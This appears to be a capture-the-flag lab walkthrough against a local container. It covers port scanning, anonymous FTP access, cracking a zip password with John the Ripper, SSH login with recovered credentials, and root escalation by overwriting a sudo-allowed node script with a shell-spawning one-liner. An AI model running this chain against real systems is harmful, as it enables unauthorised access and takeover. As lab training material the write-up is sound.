# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
```

```sh
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.106 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.041 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 0.041/0.073/0.106/0.032 ms
```
# Ports scanning
```sh
sudo nmap -sS -sV -sC 172.17.0.2
```

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
```
# FTP anonymous login
```sh
ftp 172.17.0.2

Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:codebylauti): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
# FTP enumeration
``` sh
ftp> ls -la
229 Entering Extended Passive Mode (|||25467|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        104          4096 Jul 05  2024 .
drwxr-xr-x    2 0        104          4096 Jul 05  2024 ..
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
226 Directory send OK.
```

```sh
ftp> get secretitopicaron.zip
local: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode (|||11385|)
150 Opening BINARY mode data connection for secretitopicaron.zip (242 bytes).
100% |************************************************************************************|   242        1.37 MiB/s    00:00 ETA
226 Transfer complete.
242 bytes received in 00:00 (736.22 KiB/s)
ftp> bye
```

```sh
unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password:
   skipping: password.txt            incorrect password
```
# Unzip
```sh
zip2john secretitopicaron.zip > hash.txt

ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
```

```sh
john hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (secretitopicaron.zip/password.txt)
1g 0:00:00:00 DONE 1/3 (2026-09-14 23:47) 100.0g/s 84500p/s 84500c/s 84500C/s zpassword1..psecretitopicaron1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```sh
unzip secretitopicaron.zip
password: password1

Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password:
 extracting: password.txt
```

```sh
cat password.txt
mario:laKontraseñAmasmalotaHdelbarrioH
```
# SSH login
```sh
ssh mario@172.17.0.2
mario@172.17.0.2's password: laKontraseñAmasmalotaHdelbarrioH
```
# Privilege Escalation
```sh
sudo -l

User mario may run the following commands on e39fff8e848e:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

```sh
echo 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' > script.js
```

```sh
sudo -u root /usr/bin/node /home/mario/script.js
# whoami
root
```

